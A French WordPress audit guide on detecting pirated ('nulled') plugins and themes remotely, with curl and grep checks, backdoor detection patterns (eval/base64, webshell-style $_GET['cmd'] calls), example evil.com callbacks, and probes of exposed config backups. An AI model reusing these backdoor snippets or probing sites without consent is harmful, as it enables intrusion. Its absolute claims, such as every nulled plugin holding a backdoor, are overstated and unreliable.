# 06, Détection des Plugins & Thèmes Nullés (Piratés)

> **Audit WordPress à distance, sans accès admin**
> Niveau : **Avancé** | Priorité : **Critique**
> Objectif : Identifier les plugins et thèmes nullés installés sur un site WordPress. Chaque plugin nullé = backdoor garantie. C'est votre plus gros levier de vente.

---

## Pourquoi c'est votre arme secrète

- **80%+ des sites WordPress piratés** le sont via un plugin/thème nullé
- Un nullé contient **toujours** une backdoor (volontaire ou via code obfusqué)
- Les propriétaires de site **ne savent souvent pas** qu'ils ont des nullés
- Le diagnostic « plugins nullés détectés » justifie **instantanément** un devis de nettoyage + hardening
- **Pas besoin d'accès admin** : la majorité des détections se fait par analyse HTTP, WP REST API, readme.txt, style.css et code source exposé

---

## Sommaire

1. [1. Détection par Version Mismatch (readme.txt vs code)](#1-détection-par-version-mismatch-readmetxt-vs-code)
2. [2. Détection par Mismatch Auteur (style.css / readme.txt)](#2-détection-par-mismatch-auteur-stylecss--readmetxt)
3. [3. Détection par Slug Inconnu / Plugin Fermé sur WP.org](#3-détection-par-slug-inconnu--plugin-fermé-sur-wporg)
4. [4. Sources Courantes de Plugins Nullés](#4-sources-courantes-de-plugins-nullés)
5. [5. Plugins les Plus Souvent Nullés, Détection Spécifique](#5-plugins-les-plus-souvent-nullés--détection-spécifique)
6. [6. Code Obfusqué & URLs Suspectes](#6-code-obfusqué--urls-suspectes)
7. [7. Fichiers Core WordPress Modifiés](#7-fichiers-core-wordpress-modifiés)
8. [8. Cron Jobs Suspects (WPCron)](#8-cron-jobs-suspects-wpcron)
9. [9. Assets Chargés Depuis des CDNs Inconnus](#9-assets-chargés-depuis-des-cdns-inconnus)
10. [10. Checklist Synthétique (exécution rapide)](#10-checklist-synthétique-exécution-rapide)

---

## 1. Détection par Version Mismatch (readme.txt vs code)

### Méthode
Le fichier `readme.txt` d'un plugin WordPress contient un champ `Stable tag:` qui annonce une version officielle. Les nullés manipulent souvent ce champ pour le faire correspondre à la version réelle... ou pas.

### Détection

| Technique | Commande / Méthode | Indicateur |
|-----------|-------------------|------------|
| **CURL direct du readme.txt** | `curl -s https://cible.com/wp-content/plugins/elementor-pro/readme.txt` | `Stable tag:` présent mais différent de la version dans les en-têtes PHP |
| **Différence Stable tag vs version dans l'en-tête du fichier principal** | Ex: readme dit `Stable tag: 3.12.0` mais le .php dit `Version: 3.13.1` | Mismatch = soupçon de nullé |
| **Stable tag à 1.0.0 ou version bidon** | Les nullés laissent parfois `Stable tag: 1.0.0` | Presque certain = nullé |
| **Plugin Info via WP API** | `curl -s https://api.wordpress.org/plugins/info/1.0/slug.json` | Comparez `version` retournée avec `Stable tag:` lue sur le site |
| **readme.txt manquant alors que le plugin existe** | 404 sur `/wp-content/plugins/*/readme.txt` | Suspect, thème nullé supprime souvent les fichiers identifier |
| **Plugin name/description dans readme.txt vide ou copié depuis un autre plugin** | Regex sur le contenu | Red flag |

### Severité : **ÉLEVÉE** (HIGH)
Un mismatch systématique = mise à jour désactivée + code potentiellement modifié.

> **Action** : Noter le mismatch, capturer les deux versions, qualifier le risque.

---

## 2. Détection par Mismatch Auteur (style.css / readme.txt)

### Méthode
Les thèmes WordPress ont un fichier `style.css` avec des en-têtes. Pour les plugins, l'en-tête se trouve dans le fichier PHP principal. Les nullés changent souvent le nom de l'auteur, l'URI, ou les suppriment.

### Détection

| Élément à vérifier | Commande / Méthode | Indicateur |
|-------------------|-------------------|------------|
| **Author field different from official** | `curl -s https://cible.com/wp-content/themes/betheme/style.css | grep -i "Author:"` | Si Author != auteur officiel (ex: "Nulled Team", "GPLDL", "ThemeNectar" au lieu de "Muffin Group") |
| **Author URI pointe vers site suspect** | `curl -s https://cible.com/wp-content/plugins/gravityforms/gravityforms.php | grep -i "Author URI:"` | Ex: `https://gplfreak.com`, `https://nulled.org`, `https://freemium.com`, IP quelconque |
| **Description vide ou générique** | `grep -i "Description:"` | "WordPress plugin", "Best plugin ever" au lieu de texte officiel |
| **Plugin URI manquant ou mort** | `grep -i "Plugin URI:"` | Pas d'URI, ou 404, ou redirige vers site de nullé |
| **Champs d'en-tête absents** | Un plugin légitime a TOUS les champs (Plugin Name, Plugin URI, Description, Version, Author, Author URI, Text Domain) | Champ manquant = probabilité de nullé |

### Severité : **ÉLEVÉE** (HIGH)
Surtout si Author URI pointe vers un site de nullés connu (CRITICAL).

> **Action** : Capturer les en-têtes modifiés, faire une capture d'écran de preuve.

---

## 3. Détection par Slug Inconnu / Plugin Fermé sur WP.org

### Méthode
L'API publique WordPress.org permet de vérifier si un plugin slug existe et s'il est actif ou fermé.

### Détection

```
# Vérifier si un slug existe sur WordPress.org
curl -s "https://api.wordpress.org/plugins/info/1.0/elementor-pro.json" | jq .
# Si réponse = {"error":"Plugin not found."} → plugin premium non-répertorié = normal
# Mais si le plugin PRÉTEND être un plugin connu et que le slug n'existe pas → suspect
```

| Méthode | Indicateur | Interprétation |
|---------|-----------|----------------|
| **Plugin slug not found + plugin premium** | API retourne "Plugin not found" | Normal pour les plugins premium officiels (Elementor Pro, ACF Pro...) → nécessite vérification complémentaire |
| **Plugin slug trouvé MAIS "closed"** | Vérifier le champ `closed` ou `last_updated` très ancien | Plugin fermé = n'est plus distribué officiellement. S'il est encore installé → nullé. API: `https://api.wordpress.org/plugins/info/1.0/revslider.json` |
| **Plugin slug trouvé MAIS version sur le site plus récente** | `curl -s "https://api.wordpress.org/plugins/info/1.0/contact-form-7.json" | jq '.version'` vs version lue sur site | Si version site > version API → impossible (sauf si plugin hébergé ailleurs officiellement) |
| **Plugin présent dans le repo WP mais version du site ≠ version repo** | Pour les plugins gratuits (= doivent être dans le repo) | Si version site != version repo → modification locale = nullé potentiel |
| **Plugin gratuit annoncé comme "Pro" dans les fichiers** | Vérifier les chaînes "Pro", "Premium", "Extended" dans les en-têtes | Plugin gratuit maquillé en version Pro = nullé |
| **Plugin disparu du repo (404)** | Plugin qui était dans le repo mais retiré pour violation | Signe probable de nullé |

### Plugins "Closed" courants à vérifier

| Plugin | Statut WP.org | Détection |
|--------|--------------|-----------|
| **Revolution Slider** | Fermé (abandonné, puis racheté) | Vérifier licence activée |
| **WPBakery Page Builder** | Fermé (retiré du repo) | Vérifier fichier `js_composer/js_composer.php` |
| **LayerSlider WP** | Fermé | Style.css author check |
| **Certains plugins nullés massivement** | Variable | Croiser avec blacklist mise à jour |

### Severité : **CRITIQUE**
Un plugin fermé encore installé = 0 mises à jour de sécurité = backdoor assurée.

> **Action** : Documenter le statut "closed" et recommander la suppression immédiate.

---

## 4. Sources Courantes de Plugins Nullés

### Sites de redistributions illégales (blacklist de référence)
Ces sites sont les sources où les clients (ou leur "développeur" Fiverr) téléchargent leurs nullés.

| Source | Domaine(s) | Signe distinctif |
|--------|-----------|-----------------|
| **GPL Freak** | `gplfreak.com`, `gplfreak.net` | Traces dans le code, commentaires, URLs |
| **GPL Papa** | `gplpapa.com` | Footers, crédits |
| **GPLDL / GPL Download** | `gpldl.com`, `gpldownload.com` | Version strings modifiées |
| **Nulled WordPress** | `nulled.org`, `nulledfree.com`, `nulled.pro` | Commentaires dans le code |
| **Freemium WordPress** | `freemiumdownloader.com`, `freemiumwp.com` | Modification des fichiers readme |
| **Plugin GPL** | `pluginsgpl.net`, `gplgpl.com` | Author URI systématiquement modifié |
| **WP Nulled** | `wpnulled.org`, `wpnulled.io` | Commentaires HTML, assets |
| **ThemeForest Nulled** | `themeforest.net` **est un site légitime**, les "nulled" sont des copies modifiées | Vérifier les `purchase_code` factices |
| **CodeCanyon Nulled** | `codecanyon.net` **site légitime**, idem | Vérifier les licences dans les fichiers PHP |
| **Sites Fiverr / Upwork** | `fiverr.com`, `upwork.com` (intermédiaires) | "Développeurs" qui installent des nullés sans dire au client |
| **Télégrammes / Discord** | Canaux privés "wp-nulled", "premium-plugins", etc. | Traces dans les commentaires PHP |
| **Nulled.to / Nulled.pro** | `nulled.to`, `nulled.pro` | URLs de callback, commentaires |
| **Babías** | `babia.to` | URLs de licence modifiées |
| **Leak.sx / Leakzone** | `leak.sx` | Traces dans les fichiers CSS/JS |

### Comment détecter la source

```
# Rechercher des commentaires suspects dans les fichiers JS/CSS exposés
curl -s https://cible.com/wp-content/plugins/plugin-name/assets/js/main.js | grep -ioE "(gplfreak|gplpapa|nulled|freemium|babia|gpldl)"

# Chercher des URLs calling home
curl -s https://cible.com/wp-content/plugins/plugin-name/plugin-name.php | grep -ioE "(https?://[^\s\"'`]+)" | grep -vE "(wordpress\.org|fonts\.googleapis|ajax\.googleapis|gravatar\.com|jquery|github\.com)"
```

### Severité : **CRITIQUE**
Quelle que soit la source, un nullé est une backdoor.

> **Action** : Si domaine source trouvé, capture d'écran + documentation. C'est la preuve irréfutable pour le client.

---

## 5. Plugins les Plus Souvent Nullés, Détection Spécifique

### 5.1 Elementor Pro

| Détection | Méthode | Indicateur |
|-----------|---------|------------|
| **Vérifier la licence** | Lire `elementor-pro/elementor-pro.php` → chercher `EDD_SL_*` ou `license_key` | Licence factice (ex: `00000000000000000000`) |
| **Version différent du changelog officiel** | Comparez `Version:` dans l'en-tête du fichier principal avec le [changelog Elementor Pro officiel](https://elementor.com/pro/changelog/) | Version qui n'existe pas dans le changelog officiel |
| **readme.txt absent ou modifié** | `curl -s https://cible.com/wp-content/plugins/elementor-pro/readme.txt` | 404 ou contenu bidon |
| **Fichier `api.php` ou `license.php` supprimé** | `curl -I https://cible.com/wp-content/plugins/elementor-pro/license/api.php` | 404 = nullé (la licence a été désactivée dans le code) |
| **Domaine de callback license activé** | Chercher dans les fichiers JS les appels vers `my.elementor.com` ou `elementor.com/api` | Absence de ces appels = licence désactivée = nullé |
| **Elementor Pro module licenses** | Vérifier `elementor-pro/core/connect/` | Modules de gestion de licence manquants |
| **HTML commentaires** | Inspecter le HTML : `<!-- Elementor Pro version nulled -->` | Flag évident |

### 5.2 WooCommerce Extensions (les plus nullés)

**Extensions fréquentes** : WooCommerce Subscriptions, Product Add-Ons, Composite Products, Dynamic Pricing, Memberships, Bookings

| Détection | Méthode | Indicateur |
|-----------|---------|------------|
| **Vérifier l'activation de licence** | Lire le fichier principal de l'extension | Appels à `WCS_*`, `WC_Subscriptions_*` sans licence valide |
| **Fichier de licence absent** | Tester `/wp-content/plugins/woocommerce-subscriptions/includes/class-wc-subscriptions-license.php` | 404 = nullé |
| **Version supérieure à la dernière release officielle** | API WooCommerce.com (`https://woocommerce.com/wp-json/wccom/...`) | Version inexistante = nullé |
| **Plugin slug incohérent** | Vérifier le Text Domain et Plugin Slug | WooCommerce utilise des slugs très spécifiques |
| **WooCommerce.com parent plugin slug** | Les extensions WooCommerce officielles ont un `WooCommerce` comme "PluginURI:" correct | PluginURI différent ou manquant |

### 5.3 WPBakery Page Builder (anciennement Visual Composer)

| Détection | Méthode | Indicateur |
|-----------|---------|------------|
| **Vérifier license activée ou non** | Lire `js_composer/include/classes/core/class-vc-license.php` | Licence absente = nullé |
| **Version incohérente** | Fichier `js_composer.php` Version: header | Version qui n'existe pas dans le changelog officiel |
| **Fichiers de licence modifiés** | `class-vc-updater.php` | Code de vérification de licence désactivé |
| **Activation URL** | Chercher `wpbakery.com` ou `vc.wpbakery.com` dans les appels AJAX | Absence = nullé |
| **Envato Purchase Code** | Chercher `purchase_code` dans le code source | Valeur factice = nullé |

### 5.4 Slider Revolution

| Détection | Méthode | Indicateur |
|-----------|---------|------------|
| **Version dépassée (plugin fermé sur WP.org)** | Vérifier la version installée vs dernière version connue | Plugin abandonné + plus de mises à jour = faille de sécurité |
| **Fichier `revslider/revslider_admin.php` licence section** | Chercher `validate_navigation` ou `getPurchaseCode` | Purchase code factice ou vide |
| **app/revslider/app.php** | Chercher les appels API revslider | Appels API modifiés ou désactivés |
| **Plugin fermé sur WP.org mais installé** | Vérifier le slug `revslider` sur l'API WP.org | `"closed": true` dans la réponse API |

### 5.5 Gravity Forms

| Détection | Méthode | Indicateur |
|-----------|---------|------------|
| **Licence Gravity Forms** | Lire `gravityforms/gravityforms.php` | Licence key factice |
| **Fichier `gravityforms/includes/class-gf-license.php`** | Test d'accès | Absent = nullé |
| **API Key** | Chercher `rg_gforms_key` dans les fichiers JS/Data | Clé visible dans le HTML (normalement stockée en DB seulement) |
| **Version** | Vérifier le `GFForms::$version` | Version hors-chart = nullé |
| **readme.txt** | Contenu suspect ou absent | Red flag |

### 5.6 Advanced Custom Fields Pro (ACF Pro)

| Détection | Méthode | Indicateur |
|-----------|---------|------------|
| **Fichier licence** | `advanced-custom-fields-pro/acf.php` | `acf_pro_license` ou `acf-license` manquant |
| **Version** | Vérifier la version dans l'en-tête | Version qui n'est pas sortie officiellement (ex: 6.1.0 alors que max sur ACF = 6.0.7 à date) |
| **Mise à jour désactivée** | Chercher `acf_pro_update_*` | Appels désactivés = nullé |
| **Plugin URI** | `https://www.advancedcustomfields.com` | URI modifié pointant vers autre chose |
| **License check bypass** | Chercher dans `includes/admin/views/` | Vues de licence supprimées |

### 5.7 Rank Math Pro

| Détection | Méthode | Indicateur |
|-----------|---------|------------|
| **Fichier de licence** | `seo-by-rank-math-pro/rank-math-pro.php` | Licence factice |
| **Version** | Comparer avec le changelog officiel | Version non-officielle |
| **Product registration URL** | API Rank Math `rankmath.com` | Appels absents ou modifiés |
| **Module PRO activé sans licence** | Le plugin gratuit peut être installé, mais les modules PRO nécessitent une licence | Modules PRO actifs sans licence valide |

### 5.8 WP Rocket

| Détection | Méthode | Indicateur |
|-----------|---------|------------|
| **Licence key** | Lire `wp-rocket/wp-rocket.php` | Clé de licence absente ou invalide |
| **API calls** | Chercher `wp-rocket/inc/classes/class-rocket-background-database-optimization.php` | Appels à `wp-rocket.me` désactivés |
| **Version** | Vérifier la version | Version qui n'existe pas officiellement |
| **Fichier `inc/Engine/License/`** | Tester l'accès | Fichiers de licence absents |

### 5.9 Autres plugins fréquemment nullés

| Plugin | Méthode de détection spécifique |
|--------|--------------------------------|
| **Divi / Extra Theme** | Vérifier `et_` purchase code, fichier licence absent |
| **The7 / Betheme / Avada** | Ces thèmes multipurpose sont les plus nullés. Vérifier le `purchase_code` dans les options du thème exposées via REST API |
| **Unyson (pro)** | Fichier licence absent, version non officielle |
| **LayerSlider WP** | Purchase code dans `layerslider/layerslider.php` |
| **Unlimited Elements for Elementor** | Licence check absent |
| **Essential Addons for Elementor** (version pro) | Vérifier la licence dans les fichiers |
| **Mailchimp for WooCommerce** (pro) | Licence factice |
| **Beaver Builder Pro** | Licence absente, version incohérente |
| **Real 3D Flipbook** | Version license check |
| **Booked Plugin** | Licence factice |
| **iThemes Security Pro** | Licence absente |
| **Yoast SEO Premium** | Licence absente ou clé invalide |
| **Schema Pro / AIOSEO Pro** | Licence factice |

### Severité : **CRITIQUE** pour TOUS les plugins nullés identifiés
> **Action** : Pour chaque plugin identifié, documenter : nom, version installée, version officielle, preuve de nulled (licence absente, auteur modifié, etc.), et impact.

---

## 6. Code Obfusqué & URLs Suspectes

### 6.1 Patterns d'obfuscation courants dans les nullés

Les auteurs de nullés obfusquent leur code pour masquer les backdoors.

| Pattern | Détection | Exemple |
|---------|-----------|---------|
| **`base64_decode` avec long string** | `grep -r "base64_decode" wp-content/plugins/plugin-name/` | `eval(base64_decode('verylongstring'))` |
| **`eval()` avec concaténation** | Chercher `eval(` dans les fichiers PHP | `eval($GLOBALS['...']);` |
| **`str_rot13` / `gzinflate`** | Recherche de fonctions de décompression | `eval(gzinflate(base64_decode(...)))` |
| **`preg_replace` avec `/e` modifier** (deprecated) | `grep -r "preg_replace.*\/e"` | `preg_replace('/pattern/e', ...)` = exécution de code |
| **`$GLOBALS` / `$$var` dynamique** | Variables dynamiques pour cacher les appels | `$$var('system', $_GET['cmd'])` |
| **`assert()` / `create_function()`** | Fonctions dangereuses | `create_function('', 'evil_code')` |
| **`call_user_func` avec paramètres non filtrés** | `grep -r "call_user_func"` | `call_user_func($_REQUEST['action'])` |
| **Fichiers PHP sans en-tête WordPress** | Tout fichier `.php` dans `wp-content/` qui ne commence pas par `<?php` ou qui n'a pas de commentaire d'en-tête | Possible backdoor déguisée |
| **Noms de variables absurdes** | `$a = '....'; $b = $a; $c = ...;` | Variables non-sémantiques, pas de logique lisible |
| **Fichiers `.php` cachés dans `uploads/`** | `curl -s http://cible.com/wp-content/uploads/2023/01/` (si listing activé) OU test par bruteforce de noms communs | Backdoor uploadée via nullé |
| **`class-*.php` avec noms génériques mais contenu malveillant** | Vérifier la correspondance nom de fichier ↔ classe | Incohérence |

### 6.2 URLs suspectes (callbacks / C2 / phone-home)

```
# Chercher ces patterns dans les fichiers exposés
curl -s https://cible.com/wp-content/plugins/plugin-name/plugin-name.php | grep -ioE "
  (https?://[^\s\"'`]+(gpl|freak|nulled|null|papa|babia|leak|gpl|freemium)[^\s\"'`]*)
"

# Chercher des callbacks vers IPs ou domaines suspects
grep -roE "(https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\"'`\s]*)" wp-content/plugins/
grep -roE "(https?://[a-zA-Z0-9.-]*\.(xyz|top|gq|ml|ga|cf|tk|bid|download|review)[^\"'`\s]*)" wp-content/plugins/
```

| Pattern suspect | Interprétation |
|----------------|---------------|
| Domaine en `.xyz`, `.top`, `.gq`, `.ml`, `.ga`, `.cf`, `.tk` | Domaines gratuits, très utilisés pour C2 |
| IP brute comme URL de callback | Communication directe vers serveur C2 |
| `/track.php?` , `/stats.php?` , `/log.php?` dans un plugin | Callback de statistiques déguisée |
| Domaine du site nullé (ex: `gplfreak.com/api/check`) | Phone-home pour vérifier si le site est encore actif |
| URL avec `action=verify` ou `action=license` pointant vers serveur inconnu | Fausse vérification de licence qui exfiltre des données |
| WebSocket vers inconnu | Communication persistante (C2 avancé) |
| `${` + variable + URL | Concaténation dynamique d'URL pour échapper aux regex |

### 6.3 Obfuscation par chaînes de version modifiées

Les nullés modifient souvent les chaînes de version pour masquer la version réelle ou pour désactiver les mécanismes de mise à jour.

```
# Chercher des patterns de version strings étranges
grep -roE "'version'[^;]*'[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2}(-(nulled|patched|mod|modded|free))?'" wp-content/plugins/

# Chercher des définitions de version hors norme
grep -roE "(define.*VERSION|const.*VERSION|public.*\$version).*['\"]([0-9]+\.[0-9]+.*null|nulled|9999)" wp-content/plugins/
```

### Severité : **CRITIQUE**
Code obfusqué = backdoor quasi certaine.

> **Action** : Extraire les échantillons de code obfusqué, identifier le type d'obfuscation, chercher les C2, documenter avec preuves. Si possible, décoder le base64 pour comprendre la backdoor.

---

## 7. Fichiers Core WordPress Modifiés

### 7.1 Détection via API REST

Même sans accès admin, il est possible de détecter des modifications du core.

```
# Récupérer la version de WordPress depuis le readme.html ou generator tag
curl -s https://cible.com/readme.html | grep "Version"
# ou depuis le meta generator
curl -s https://cible.com/ | grep -i "generator.*wordpress"

# Vérifier les hash via WP-CLI (si accessible) ou directement
# En remote, on ne peut pas checksummer TOUS les fichiers, mais on peut cibler :
```

### 7.2 Fichiers critiques à vérifier à distance

| Fichier | Méthode de vérification | Indicateur de compromission |
|---------|------------------------|----------------------------|
| **wp-settings.php** | `curl -I https://cible.com/wp-settings.php` | Taille anormale, commentaires "nulled", code obfusqué |
| **wp-load.php** | Lire les 50 premières lignes | Fichier modifié pour charger des backdoors |
| **wp-config.php** (visible via backup) | `curl -I https://cible.com/wp-config.php~` ou `.bak` | Exposition accidentelle du fichier avec configuration modifiée |
| **index.php** | Télécharger et comparer avec hash officiel | `<?php` modifié, code ajouté |
| **wp-includes/default-constants.php** | Vérifier la taille (via Content-Length) | Taille différente de l'officielle |
| **xmlrpc.php** | Vérifier la taille | Souvent modifié pour servir de backdoor |
| **wp-comments-post.php** | Anomalie de taille | Backdoor dans les commentaires |
| **wp-blog-header.php** | Hash du fichier | Modification suspecte |

### 7.3 Comparaison de checksums (méthode avancée)

```
# Pour chaque fichier core accessible en lecture, on peut en théorie comparer avec le checksum officiel
# 1. Récupérer la checksum officielle pour la version :
curl -s "https://api.wordpress.org/core/checksums/1.0/?version=6.4.2&locale=fr_FR" | jq '.checksums["wp-includes/version.php"]'

# 2. Télécharger le fichier distant
curl -s https://cible.com/wp-includes/version.php | md5sum

# 3. Comparer
# Si différent → fichier modifié
```

**Limitations** : Certains hébergeurs modifient légalement les fichiers (ex: ajout de cache). Distinguer modifications légitimes vs malveillantes nécessite de l'expertise.

### 7.4 Modifications core typiques des nullés

| Modification | Détection | Exemple |
|-------------|-----------|---------|
| **Ajout de code dans `wp-config.php`** | Impossible à distance (non accessible) | Mais visible via backup exposé |
| **`wp-includes/functions.php` modifié** | Checksum différent | Ajout de fonctions de backdoor |
| **`wp-includes/pluggable.php` modifié** | Checksum différent | Détournement de `wp_mail()`, `wp_authenticate()` |
| **Nouveaux fichiers dans `wp-includes/`** | Tester `wp-includes/backdoor.php`, `wp-includes/cache-hit.php`, etc. | Fichier inconnu dans le core |
| **Fichier `.htaccess` dans `wp-includes/`** | `curl -I https://cible.com/wp-includes/.htaccess` | Accès PHP autorisé dans wp-includes (anormal) |

### Severité : **CRITIQUE**
Une modification du core signifie que le site est entièrement compromis.

> **Action** : Documenter les fichiers modifiés, leurs checksums, les checksums officiels. Recommander une réinstallation complète du core WordPress.

---

## 8. Cron Jobs Suspects (WPCron)

### 8.1 Détection via wp-cron exposé

WordPress utilise son propre système de cron (`wp-cron.php`) pour les tâches planifiées. Les nullés ajoutent souvent leurs propres cron jobs pour :
- Phone-home (envoyer des infos au serveur du nullé)
- Télécharger des mises à jour malveillantes
- Créer des utilisateurs admin périodiquement
- Exfiltrer des données

### 8.2 Méthodes de détection

```
# 1. Vérifier le comportement de wp-cron
curl -I "https://cible.com/wp-cron.php"  # Voir les headers

# 2. Si REST API est accessible, tenter de lister les cron jobs
# (nécessite un nonce - difficile sans auth, mais on peut tenter)
curl "https://cible.com/wp-json/wp/v2/settings"  # Bloqué sans auth

# 3. Analyse des appels AJAX publics côté client
# Analyser le JavaScript pour détecter des appels cron personnalisés
curl -s https://cible.com/ | grep -oE "admin-ajax\.php[^\"']*" | sort -u

# 4. Chercher les hooks cron dans les fichiers de plugins/themes exposés
grep -roE "wp_schedule_event|wp_next_scheduled|wp_clear_scheduled_hook" wp-content/plugins/
grep -roE "add_action.*wp_cron.*" wp-content/plugins/
```

### 8.3 Hooks cron suspects à chercher

| Hook | Détection (dans les fichiers exposés) | Risque |
|------|---------------------------------------|--------|
| `plugin_name_daily_verify` | `grep -r "daily_verify\|daily_check\|phone_home"` | Phone-home quotidien |
| `gpl_license_check` | `grep -r "gpl_license\|freemium_check\|license_verify"` | Licence check vers serveur malveillant |
| `wp_update_remote_data` | `grep -r "remote_data\|data_sync\|update_check"` | Exfiltration de données |
| `send_stats_weekly` | `grep -r "send_stats\|usage_report\|telemetry"` | Vol de données |
| `backdoor_create_admin` | `grep -ri "create_user\|wp_create_user.*admin"` | Création d'admin périodique |
| `cron_db_backdoor` | `grep -ri "cron.*db\|db.*update\|table.*insert"` | Backdoor dans la DB |
| `health_check_user` | `grep -ri "health_check\|keep_alive\|heartbeat.*callback"` | Maintien de l'accès au site |

### 8.4 Détection via appels AJAX suspects

```
# Voir quels appels AJAX sont enregistrés et accessibles
curl -s https://cible.com/ | grep -oE "action=[a-zA-Z0-9_-]+" | sort -u

# Tester des actions AJAX courantes de nullés
curl -s "https://cible.com/wp-admin/admin-ajax.php?action=health_check"  # Nonce pas nécessaire
curl -s "https://cible.com/wp-admin/admin-ajax.php?action=plugin_check_in"
curl -s "https://cible.com/wp-admin/admin-ajax.php?action=license_verify"
```

### 8.5 Intervalles de cron suspects

| Intervalle | Risque |
|------------|--------|
| `daily` | Standard (legit), mais à vérifier |
| `twicedaily` | Standard, mais suspect si hook inconnu |
| `hourly` | Plus rare pour des hooks personnalisés |
| `every5min` ou intervalle personnalisé | Très suspect |
| Intervalle en secondes non-standard (ex: `300`, `600`, `3600`) | Souvent utilisé par les backdoors |

### Severité : **ÉLEVÉE** (HIGH) à **CRITIQUE**
Un cron malveillant est persistant et s'exécute même si le site est nettoyé (s'il est stocké en DB).

> **Action** : Si un hook cron suspect est identifié, noter le nom du hook, l'intervalle, et le fichier source. Recommander la vérification des crons via la DB WordPress.

---

## 9. Assets Chargés Depuis des CDNs Inconnus

### 9.1 Pourquoi c'est un indicateur fort

Les plugins nullés chargent parfois des assets (JS, CSS, images) depuis des serveurs contrôlés par l'attaquant. C'est une forme de **persistance** et de **C2** car le JS externe peut être mis à jour à tout moment sans passer par le site.

### 9.2 Détection

```
# Analyser toutes les ressources externes chargées par le site
curl -s https://cible.com/ | grep -ioE "(src|href)=[\"'](https?://[^\"']+)" | grep -vE "
  (googleapis\.com|
   google-analytics|
   googletagmanager|
   facebook\.com|
   twitter\.com|
   linkedin\.com|
   fonts\.googleapis|
   ajax\.googleapis|
   gravatar\.com|
   gstatic\.com|
   jquery\.com|
   code\.jquery\.com|
   cdnjs\.cloudflare\.com|
   stackpath\.bootstrapcdn\.com|
   maxcdn\.bootstrapcdn\.com|
   netdna\.bootstrapcdn\.com|
   wp\.com|
   youtube\.com|
   vimeo\.com|
   github\.com|
   unpkg\.com|
   jsdelivr\.net|
   cdn\.jsdelivr\.net|
   polyfill\.io|
   cdn\.elementor\.com|
   maps\.googleapis|
   player\.vimeo|
   ssl\.google-analytics|
   www\.googletagmanager|
   connect\.facebook|
   platform\.twitter|
   [a-z]*\.cloudfront\.net|
   [a-z]*\.s3[^\.]*\.amazonaws\.com
  )
"
```

### 9.3 Patterns suspects

| Pattern | Détection | Risque |
|---------|-----------|--------|
| **CDN inconnu dans les assets du thème/plugin** | Un thème qui charge `//cdn-unknown.com/themes/betheme/js/slider.js` | Le fichier JS peut être modifié à distance |
| **JS avec version paramétrée** | `//cdn.com/script.js?v=20230101` | Version qui change = mise à jour distante du code malveillant |
| **Asset chargé depuis domaine qui ressemble à un CDN** | `cdn-gplfreak.com`, `wp-nulled.s3.amazonaws.com` | = Source nullée |
| **Webfont depuis serveur inconnu** | Font Awesome ou Google Fonts depuis source non-officielle | Tracking via User-Agent |
| **Image 1x1 pixel depuis domaine suspect** | `<img src="https://tracker.evil.com/beacon.gif"` | Pixel de tracking = C2 |
| **WebSocket vers domaine inconnu** | `new WebSocket('wss://socket.evil.com')` | Communication persistante C2 |
| **Service Worker enregistré depuis source externe** | `navigator.serviceWorker.register('https://evil.com/sw.js')` | Contrôle total du navigateur |
| **`<script>` avec intégrité falsifiée** | Script tag avec `integrity=` mais contenu modifié | Tentative de contournement CSP |

### 9.4 Méthode avancée : Audit des dépendances externes

```
# 1. Capturer toutes les URLs externes
curl -s https://cible.com/ | grep -oE "https?://[a-zA-Z0-9./?=_%-]*\.(js|css|png|jpg|gif|svg|webp|woff2?)" | sort -u > external_assets.txt

# 2. Filtrer les CDN légitimes
# Garder uniquement les domaines inconnus

# 3. Vérifier chaque domaine inconnu
for domain in $(cat external_assets.txt | sed 's|https?://||' | cut -d/ -f1 | sort -u); do
  echo "=== $domain ==="
  curl -sI "https://$domain" | head -5
  # Vérifier WHOIS si nécessaire
  whois "$domain" | grep -iE "(registrant|creation|expiration)" | head -3
done

# 4. Vérifier les sous-domaines suspects
# Chercher des sous-domaines comme : cdn.ciblesite.com, static.ciblesite.com
# Si ces sous-domaines ne sont pas dans la config DNS officielle du client
```

### 9.5 Vérification des appels réseau (browser-level)

Méthode avec un vrai navigateur (playwright/puppeteer recommandé) :

```
# Script conceptuel (nécessite Playwright)
# 1. Naviguer vers le site
# 2. Capturer TOUS les appels réseau
# 3. Filtrer par domaine
# 4. Identifier les appels vers des domaines non-blancs
# 5. Analyser le contenu des fichiers JS chargés
```

### Severité : **CRITIQUE**
Un asset externe = capacité pour l'attaquant de modifier le comportement du site à tout moment, sans accès au serveur.

> **Action** : Documenter chaque domaine externe inconnu avec le chemin exact de l'asset. Vérifier le contenu du JS chargé. Recommander la suppression immédiate du plugin/thème qui charge ces assets.

---

## 10. Checklist Synthétique (exécution rapide)

### Phase 1 : Reconnaissance (5 minutes)

- [ ] 1.1 Lister tous les plugins via `/wp-content/plugins/` (directory listing ou bruteforce)
- [ ] 1.2 Lister tous les thèmes via `/wp-content/themes/`
- [ ] 1.3 Version WordPress via `/readme.html` ou `<meta generator>`
- [ ] 1.4 Version de chaque plugin via `readme.txt` accessible

### Phase 2 : Vérification rapide (15 minutes)

- [ ] 2.1 Vérifier `Stable tag:` vs en-tête `Version:` dans le fichier principal
- [ ] 2.2 Vérifier `Author:` et `Author URI:` dans les en-têtes
- [ ] 2.3 Vérifier `Plugin URI:` vs source officielle connue
- [ ] 2.4 Vérifier chaque slug de plugin gratuit sur l'API WP.org
- [ ] 2.5 Vérifier le statut "closed" des plugins sur WP.org

### Phase 3 : Détection avancée (30 minutes)

- [ ] 3.1 Scanner le code source des plugins pour `base64_decode`, `eval(`, `gzinflate`
- [ ] 3.2 Chercher les domaines suspects dans les fichiers PHP/JS (gplfreak, nulled, etc.)
- [ ] 3.3 Vérifier les assets externes (CDN inconnus, domaines suspects)
- [ ] 3.4 Comparer les checksums des fichiers core WP (si possible)
- [ ] 3.5 Analyser les appels AJAX publics pour détecter des hooks suspects
- [ ] 3.6 Vérifier la présence de fichiers de licence absents pour les plugins premium
- [ ] 3.7 Chercher les hooks `wp_schedule_event` personnalisés
- [ ] 3.8 Inspecter les variables dynamiques et les chaînes obfusquées

### Phase 4 : Rapport (20 minutes)

- [ ] 4.1 Documenter chaque nullé avec preuve (code source, URL, capture d'écran)
- [ ] 4.2 Évaluer la criticité par plugin
- [ ] 4.3 Proposer un plan de correction (suppression + alternative légitime)
- [ ] 4.4 Recommander un audit complet du site (recherche de backdoors)
- [ ] 4.5 Proposer un contrat de maintenance + hardening

---

